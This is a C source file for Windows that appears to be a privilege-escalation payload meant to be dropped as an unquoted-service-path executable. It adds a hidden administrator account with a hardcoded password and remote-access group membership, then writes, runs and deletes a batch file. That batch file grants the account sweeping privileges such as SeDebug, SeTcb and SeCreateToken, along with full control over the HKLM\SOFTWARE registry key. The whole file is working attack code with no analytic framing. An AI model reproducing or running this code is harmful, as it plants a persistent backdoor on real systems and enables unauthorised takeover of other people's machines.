#include <stdlib.h>   
#include <stdio.h>

int main() {
    // Create the user 'evil' with a password
    system("net user rootshell Welcome@1234 /add");
    
    // Add the user 'evil' to the Administrators group
    system("net localgroup Administrators rootshell /add");
    
    // Add the user 'evil' to the Remote Management Users group
    system("net localgroup \"Remote Management Users\" rootshell /add");
    
    // Add the user 'evil' to the Remote Desktop Users group
    system("net localgroup \"Remote Desktop Users\" rootshell /add");

    // Create a batch file to grant multiple privileges
    FILE *fp = fopen("grant_privileges.bat", "w");
    if (fp != NULL) {
        fprintf(fp, "ntrights +r SeImpersonatePrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeAssignPrimaryTokenPrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeTcbPrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeBackupPrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeRestorePrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeCreateTokenPrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeLoadDriverPrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeTakeOwnershipPrivilege -u rootshell\n");
        fprintf(fp, "ntrights +r SeDebugPrivilege -u rootshell\n");
        fprintf(fp, "powershell.exe -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Set-Acl -Path \\\"HKLM:\\\\SOFTWARE\\\" -AclObject (Get-Acl -Path \\\"HKLM:\\\\SOFTWARE\\\").SetAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule(\\\"rootshell\\\", \\\"FullControl\\\", \\\"Allow\\\")))\"' -Verb RunAs\"\n");
        fclose(fp);
    } else {
        printf("Failed to create the batch file\n");
        return 1;
    }

    // Run the batch file to grant privileges
    system("grant_privileges.bat");

    // Optionally, delete the batch file after execution
    remove("grant_privileges.bat");

    return 0;  
}

// rootshell : Welcome@1234

//compile
//x86_64-w64-mingw32-gcc adduser.c -o aun-quoted-service.exe 
//32bit:   i686-w64-mingw32-gcc 
